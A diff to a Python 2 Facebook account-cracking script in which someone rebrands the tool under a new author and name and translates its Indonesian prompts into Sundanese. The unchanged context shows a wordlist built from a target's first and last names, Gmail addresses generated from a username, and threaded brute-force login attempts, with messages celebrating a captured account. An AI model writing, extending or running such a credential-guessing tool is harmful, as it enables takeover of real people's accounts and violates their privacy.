@@ -1,7 +1,7 @@
 # -*- coding UTF-8 -*-
-#  Author : Iqbal Dev
-#  Tools : Geli2 Efbeh
-#  Versi : 0.4
+#  Author : Surya Gumawang
+#  Tools : SFGamink
+#  Versi : 0.1
 
 from prettytable import PrettyTable
 from multiprocessing.pool import Process, ThreadPool
@@ -16,12 +16,12 @@ def Wordlist():
 
 	try:
 		print string1
-		print "\033[96;1m        B U A T   W O R D L I $ T "
+		print "\033[96;1m        Nyieun   W O R D L I $ T "
 		print '\033[92;1m+'+'-'*38+'+' 
-		nama1 = raw_input("\033[96;1m [\033[95;1m!\033[96;1m]\033[97;1m Masukkan Nama Depan Target\033[93;1m : ")
-		nama2 = raw_input("\033[96;1m [\033[95;1m!\033[96;1m]\033[97;1m Masukkan Nama Belakang Target\033[93;1m : ")
+		nama1 = raw_input("\033[96;1m [\033[95;1m!\033[96;1m]\033[97;1m Abuskeun Ngaran Harep Target\033[93;1m : ")
+		nama2 = raw_input("\033[96;1m [\033[95;1m!\033[96;1m]\033[97;1m Abusekun Ngaran Tukang Target\033[93;1m : ")
 		if nama1 == '' or nama2 == '':
-			sys.exit("\n\033[91;1m Jangan Kosong dong Sayang!\n Kamu Keluar...")
+			sys.exit("\n\033[91;1m Tong Kosong Ath Euyy!\n Maneh Keluar...")
 		d = nama1.replace(' ', '').replace('  ', '')
 		b = nama2.replace(' ', '').replace('  ', '')
 		lis = ['123','12345','321']
@@ -35,22 +35,22 @@ def Wordlist():
 	except KeyboardInterrupt:
 		print "\n Keluar.... "
 
-	print " \n\033[92;1m   Suksess Membuat Wordlist..."
+	print " \n\033[92;1m   Suksess Nyieun Wordlist..."
 		
 user1 = []
 
 def target():
 	global target
 	print string2
-	user = raw_input("\033[96;1m {\033[97;1m@\033[96;1m}\033[92;1m Masukkan Username Target:\n\033[93;1m  => \033[97;1m ")	
+	user = raw_input("\033[96;1m {\033[97;1m@\033[96;1m}\033[92;1m Abuskeun Username Target:\n\033[93;1m  => \033[97;1m ")	
 	if '08' not in user and '+62' not in user and '.' not in user and '1000' not in user and 'www.facebook.com' not in user and 'web.facebook.com' not in user or '@' in user[0]:
 		print '\033[91;1m+'+'-'*38+'+'
-		print "\033[97;1m Masukkin Username Lol, Bukan Nama orangnya..\n Tapi gk pp lah, kamu masih bisa crack \n Walaupun Tidak Bertarget.."
+		print "\033[97;1m Abuskeun Username Lol, lain Ngaran Jalmina..\n Tapi Te Nanaon lah, Maneh masih bisa cokot \n Walaupun Tidak Bertarget.."
 		print '\033[91;1m+'+'-'*38+'+'
 		gm = user.replace(' ', '').replace('@', '')
 		for dev in range(1, 51):
 			user1.append(gm+str(dev)+'@gmail.com')
-		print "\n\033[92;1m Cracking Berjalan.......\n"
+		print "\n\033[92;1m Cokot Berjalan.......\n"
 		h_sandi = [sandi[0], sandi[1]]
 		def br_dev(usr):
 			for pas in h_sandi:
@@ -70,7 +70,7 @@ def target():
 					print '\033[97;1m'
 					print x
 				
-					print('\n\033[96;1m  Selamat Anda Sedang Beruntung :)\n Tekan CTRL Z Untuk Berhenti...\n')
+					print('\n\033[96;1m  Sip Maneh Menang Akunna :)\n Tekan CTRL Z Untuk Berhenti...\n')
 				  	
 			  except requests.exceptions.ConnectionError:
 				  	exit(' Gangguan Koneksi Internet\n Keluarrr....')
@@ -112,7 +112,7 @@ def br_dev1(paswq):
 		print x
 		divev()
 		deviv()
-		raw_input('\n\033[96;1m  Selamat Anda Sedang Beruntung :)\n Tekan CTRL Z Untuk Berhenti...\n')
+		raw_input('\n\033[96;1m  Sip Maneh Menang Akun :)\n Tekan CTRL Z Untuk Berhenti...\n')
 		
 	  except:
 	  	pass
@@ -127,6 +127,6 @@ def brute():
 	dev.map(br_dev1, sandi)
 	divev()
 	deviv()
-	print '\n\033[92;1m    Selesai Broo..... \n  '
+	print '\n\033[92;1m    Beres Broo..... \n  '
 
 
